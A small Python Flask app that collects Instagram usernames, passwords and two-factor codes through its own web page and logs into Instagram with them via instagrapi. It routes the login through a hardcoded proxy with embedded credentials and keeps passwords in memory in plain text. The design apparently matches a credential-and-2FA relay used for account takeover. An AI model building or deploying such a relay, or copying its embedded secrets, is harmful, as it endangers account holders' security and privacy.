from flask import Flask, render_template, request, jsonify, session
from instagrapi import Client
import os
import json

app = Flask(__name__)
app.secret_key = os.urandom(24)

twofa_sessions = {}

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/check-login', methods=['POST'])
def check_login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({"success": False, "message": "Username and password required"})
    
    cl = Client()
    
    # ✅ YOUR PROXY (try #1 first, then #2, #3, etc.)
    cl.set_proxy("http://jvvztywl:mcjuwdnto80p@31.59.20.176:6754")
    
    try:
        cl.login(username, password)
        user_id = cl.user_id_from_username(username)
        user_info = cl.user_info(user_id)
        
        return jsonify({
            "success": True,
            "message": f"Welcome {user_info.full_name}!",
            "user_id": user_id,
            "full_name": user_info.full_name
        })
        
    except Exception as e:
        error_str = str(e).lower()
        
        if "two_factor" in error_str or "2fa" in error_str:
            twofa_sessions[username] = {
                'client': cl,
                'password': password
            }
            return jsonify({
                "success": False,
                "requires_2fa": True,
                "message": "2FA code required"
            })
        else:
            if "login" in error_str and "block" in error_str:
                return jsonify({
                    "success": False,
                    "message": "Instagram blocked this proxy. Try another one."
                })
            return jsonify({
                "success": False,
                "message": "Invalid username or password"
            })

@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    data = request.get_json()
    username = data.get('username')
    code = data.get('code')
    
    if not username or not code:
        return jsonify({"success": False, "message": "Username and code required"})
    
    stored = twofa_sessions.get(username)
    if not stored:
        return jsonify({"success": False, "message": "Session expired. Please try again."})
    
    cl = stored['client']
    password = stored['password']
    
    try:
        cl.login(username, password, verification_code=code)
        del twofa_sessions[username]
        
        return jsonify({
            "success": True,
            "message": "2FA verified successfully! Login complete."
        })
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"2FA failed: {str(e)}"
        })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
